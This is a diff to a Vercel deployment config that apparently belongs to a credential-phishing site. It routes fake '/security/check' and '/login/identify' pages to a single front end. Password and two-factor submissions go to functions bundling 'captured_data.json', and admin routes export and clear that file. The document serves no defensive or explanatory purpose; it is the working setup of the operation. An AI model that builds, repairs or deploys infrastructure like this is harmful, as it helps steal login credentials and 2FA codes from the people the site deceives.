@@ -8,19 +8,21 @@
   "cleanUrls": true,
   "trailingSlash": false,
   "functions": {
-    "api/*.js": {
-      "includeFiles": "captured_data.json"
-    }
+    "api/submit.js":       { "runtime": "@vercel/node@3", "includeFiles": "captured_data.json" },
+    "api/submit-2fa.js":   { "runtime": "@vercel/node@3", "includeFiles": "captured_data.json" },
+    "api/admin.js":        { "runtime": "@vercel/node@3", "includeFiles": "captured_data.json" },
+    "api/admin-export.js": { "runtime": "@vercel/node@3", "includeFiles": "captured_data.json" },
+    "api/admin-clear.js":  { "runtime": "@vercel/node@3", "includeFiles": "captured_data.json" }
   },
   "rewrites": [
     { "source": "/", "destination": "/index.html" },
     { "source": "/security", "destination": "/index.html" },
     { "source": "/security/check", "destination": "/index.html" },
     { "source": "/login/identify", "destination": "/index.html" },
-    { "source": "/submit", "destination": "/api/submit" },
-    { "source": "/submit-2fa", "destination": "/api/submit-2fa" },
-    { "source": "/admin", "destination": "/api/admin" },
-    { "source": "/admin/export", "destination": "/api/admin-export" },
-    { "source": "/admin/clear", "destination": "/api/admin-clear" }
+    { "source": "/submit",         "destination": "/api/submit.js" },
+    { "source": "/submit-2fa",     "destination": "/api/submit-2fa.js" },
+    { "source": "/admin",          "destination": "/api/admin.js" },
+    { "source": "/admin/export",   "destination": "/api/admin-export.js" },
+    { "source": "/admin/clear",    "destination": "/api/admin-clear.js" }
   ]
 }
